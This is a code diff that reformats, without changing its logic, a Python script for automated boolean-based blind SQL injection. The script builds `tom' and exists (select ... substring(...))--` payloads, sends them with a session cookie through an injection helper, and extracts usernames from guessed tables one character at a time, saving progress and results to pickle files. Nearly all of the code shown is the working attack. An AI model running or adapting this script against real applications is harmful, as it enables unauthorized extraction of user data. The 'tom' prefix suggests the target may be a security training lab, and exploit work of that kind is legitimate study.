@@ -10,19 +10,23 @@ def print_usernames():
 
     for entry in data:
         for (table_name, column_name), usernames in entry.items():
-            row.append([table_name, column_name,','.join(usernames)])
+            row.append([table_name, column_name, ','.join(usernames)])
 
     print(tabulate.tabulate(row, headers=["Table Name", "Column Name", "Usernames"]))
 
 
 def check_query(column_name, table_name, user_id):
-    return f'tom\' and exists (select {column_name} from {table_name} where ' \
-           f'{column_name}=\'{user_id}\')--'
+    return (
+        f'tom\' and exists (select {column_name} from {table_name} where '
+        f'{column_name}=\'{user_id}\')--'
+    )
 
 
 def builder_query(column_name, table_name, length, word):
-    return f'tom\' and exists (select {column_name} from {table_name} where ' \
-           f'substring({column_name},1, {length})=\'{word}\')--'
+    return (
+        f'tom\' and exists (select {column_name} from {table_name} where '
+        f'substring({column_name},1, {length})=\'{word}\')--'
+    )
 
 
 def get_usernames(cookie):
@@ -46,19 +50,30 @@ def get_usernames(cookie):
                         queue_word = queue.pop(0)
                         for a in alphabets:
                             word = queue_word + a
-                            query = builder_query(column_name=column, table_name=table_name, length=len(word),
-                                                  word=word)
+                            query = builder_query(
+                                column_name=column,
+                                table_name=table_name,
+                                length=len(word),
+                                word=word,
+                            )
                             no_of_queries += 1
                             if inject.inject(cookie=cookie, query=query):
-                                print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
+                                print(
+                                    f'Found Word: {word}, {len(word)} - Table: {table_name}'
+                                )
                                 all_usernames.append(word)
                                 queue.append(word)
 
                         program_state_usernames.append([queue, all_usernames])
-                        pickle.dump(program_state_usernames, open('states/program_state_usernames.pkl', 'wb'))
+                        pickle.dump(
+                            program_state_usernames,
+                            open('states/program_state_usernames.pkl', 'wb'),
+                        )
 
                     for name in all_usernames:
-                        query = check_query(column_name=column, table_name=table_name, user_id=name)
+                        query = check_query(
+                            column_name=column, table_name=table_name, user_id=name
+                        )
                         no_of_queries += 1
                         if inject.check(cookie=cookie, query=query):
                             print(f'Found Username: {name}')
@@ -67,6 +82,8 @@ def get_usernames(cookie):
                     print(usernames)
                     pickle.dump(usernames, open('outputs/usernames.pkl', 'wb'))
                 else:
-                    print(f'None of the keywords match for table name {table_name}. Please manually check for the username column name.')
+                    print(
+                        f'None of the keywords match for table name {table_name}. Please manually check for the username column name.'
+                    )
 
     print(f'No of queries: {no_of_queries}')
